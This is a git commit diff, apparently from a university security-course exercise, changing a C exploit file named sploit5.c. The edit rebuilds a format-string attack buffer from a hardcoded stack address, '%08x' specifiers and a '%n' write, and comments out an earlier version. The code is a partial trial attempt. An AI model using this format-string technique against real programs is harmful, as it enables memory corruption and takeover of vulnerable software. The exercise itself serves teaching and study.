b1884d427fa4e5a8acdf6589c41e5341b88190a7
evilfrog262 <kcox3@wisc.edu>
2014-02-18 14:44:08 -0800

    Oh my gosh it might be writing to an address O_o

--- sploits/sploit5.c
+++ sploits/sploit5.c
@@ -11,16 +11,17 @@ int main(void)
   int i;
   char *args[3];
   char *env[1];
-  char buf[307];
-  memset(buf, 0x90, 307);
+  char buf[18];
+  memset(buf, 0x90, 18);
 
-  strncpy(buf, "\x30\xfb\xff\xbf", 4);
-  for(i = 0; i < 113; i++) {
-    strncpy(buf+4+(i*4), "%08x", 4); 
-  }
+  strncpy(buf, "\x40\xfb\xff\xbf%08x%08x%08x%n", 18); 
+
+  //for(i = 0; i < 113; i++) {
+    //strncpy(buf+4+(i*4), "%08x", 4); 
+  //}
   
-  strncpy(buf+305, "%n", 2);
-  //printf(buf);
+  //strncpy(buf+305, "%n", 2);
+  
   //strncpy(buf+240, "\x70", 1);
   //strncpy(buf+236, "\x08\xfd\xff\xbf", 4);
   //strncpy(buf+244, "\x12\x34\x56\x78", 4);
